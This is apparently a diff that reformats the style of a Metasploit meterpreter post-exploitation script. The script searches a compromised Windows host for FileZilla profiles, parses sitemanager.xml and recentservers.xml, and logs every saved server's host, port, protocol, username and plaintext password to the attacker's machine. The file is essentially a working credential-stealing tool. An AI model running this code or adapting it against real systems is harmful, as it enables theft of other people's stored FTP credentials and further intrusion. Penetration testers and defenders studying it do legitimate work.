@@ -1,100 +1,96 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
-
 require "rexml/document"
 
 #-------------------------------------------------------------------------------
-#Options and Option Parsing
+# Options and Option Parsing
 opts = Rex::Parser::Arguments.new(
   "-h" => [ false, "Help menu." ],
   "-c" => [ false, "Return credentials." ]
 )
 
-get_credentials=false
+get_credentials = false
 
-opts.parse(args) { |opt, idx, val|
+opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-h"
     print_line "Meterpreter Script for extracting servers and credentials from Filezilla."
     print_line(opts.usage)
     raise Rex::Script::Completed
   when "-c"
-    get_credentials=true
+    get_credentials = true
   end
-}
+end
 ### If we get here and have none of our flags true, then we'll just
 ###   get credentials
-if !(get_credentials)
-  get_credentials=true
-end
+get_credentials = true unless get_credentials
 
 #-------------------------------------------------------------------------------
-#Set General Variables used in the script
+# Set General Variables used in the script
 @client = client
 os = @client.sys.config.sysinfo['OS']
 host = @client.sys.config.sysinfo['Computer']
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'filezilla', Rex::FileUtils.clean_path(host + filenameinfo) )
+logs = ::File.join(Msf::Config.log_directory, 'filezilla', Rex::FileUtils.clean_path(host + filenameinfo))
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
-#logfile name
+# logfile name
 dest = Rex::FileUtils.clean_path(logs + "/" + host + filenameinfo + ".txt")
 
 #-------------------------------------------------------------------------------
-#function for checking of FileZilla profile is present
+# function for checking of FileZilla profile is present
 def check_filezilla(path)
   found = nil
   @client.fs.dir.foreach(path) do |x|
     next if x =~ /^(\.|\.\.)$/
-    if x =~ (/FileZilla/)
+    if x =~ /FileZilla/
       ### If we find the path, let's return it
       found = path + x
       return found
     end
   end
-  return found
+  found
 end
 
 #-------------------------------------------------------------------------------
 
-def extract_saved_creds(path,xml_file)
+def extract_saved_creds(path, xml_file)
   accounts_xml = ""
   creds = ""
   print_status("Reading #{xml_file} file...")
   ### modified to use pidgin_path, which already has .purple in it
   account_file = @client.fs.file.new(path + "\\#{xml_file}", "rb")
-  until account_file.eof?
-    accounts_xml << account_file.read
-  end
+  accounts_xml << account_file.read until account_file.eof?
   account_file.close
   doc = (REXML::Document.new accounts_xml).root
   doc.elements.to_a("//Server").each do |e|
-    print_status "\tHost: #{e.elements["Host"].text}"
-    creds << "Host: #{e.elements["Host"].text}"
-    print_status "\tPort: #{e.elements["Port"].text}"
-    creds << "Port: #{e.elements["Port"].text}"
+    print_status "\tHost: #{e.elements['Host'].text}"
+    creds << "Host: #{e.elements['Host'].text}"
+    print_status "\tPort: #{e.elements['Port'].text}"
+    creds << "Port: #{e.elements['Port'].text}"
     logon_type = e.elements["Logontype"].text
     if logon_type == "0"
       print_status "\tLogon Type: Anonymous"
       creds << "Logon Type: Anonymous"
     elsif logon_type =~ /1|4/
-      print_status "\tUser: #{e.elements["User"].text}"
-      creds << "User: #{e.elements["User"].text}"
-      print_status "\tPassword: #{e.elements["Pass"].text}"
-      creds << "Password: #{e.elements["Pass"].text}"
+      print_status "\tUser: #{e.elements['User'].text}"
+      creds << "User: #{e.elements['User'].text}"
+      print_status "\tPassword: #{e.elements['Pass'].text}"
+      creds << "Password: #{e.elements['Pass'].text}"
     elsif logon_type =~ /2|3/
-      print_status "\tUser: #{e.elements["User"].text}"
-      creds << "User: #{e.elements["User"].text}"
+      print_status "\tUser: #{e.elements['User'].text}"
+      creds << "User: #{e.elements['User'].text}"
     end
 
     proto = e.elements["Protocol"].text
-    if  proto == "0"
+    if proto == "0"
       print_status "\tProtocol: FTP"
       creds << "Protocol: FTP"
     elsif proto == "1"
@@ -109,13 +105,13 @@ def extract_saved_creds(path,xml_file)
     end
     print_status ""
     creds << ""
-
   end
-#
-  return creds
+  #
+  creds
 end
+
 #-------------------------------------------------------------------------------
-#Function to enumerate the users if running as SYSTEM
+# Function to enumerate the users if running as SYSTEM
 def enum_users(os)
   users = []
 
@@ -146,7 +142,7 @@ def enum_users(os)
     userinfo['userappdata'] = path4users + uservar + path2purple
     users << userinfo
   end
-  return users
+  users
 end
 
 ################## MAIN ##################
@@ -160,10 +156,10 @@ if client.platform =~ /win32|win64/
     if filezilla_path
       print_status("FileZilla profile found!")
       ### modified to use filezilla_path
-      xml_cfg_files = ['sitemanager.xml','recentservers.xml']
+      xml_cfg_files = ['sitemanager.xml', 'recentservers.xml']
       if get_credentials
         xml_cfg_files.each do |xml_cfg_file|
-          file_local_write(dest,extract_saved_creds(filezilla_path,xml_cfg_file))
+          file_local_write(dest, extract_saved_creds(filezilla_path, xml_cfg_file))
         end
       end
 
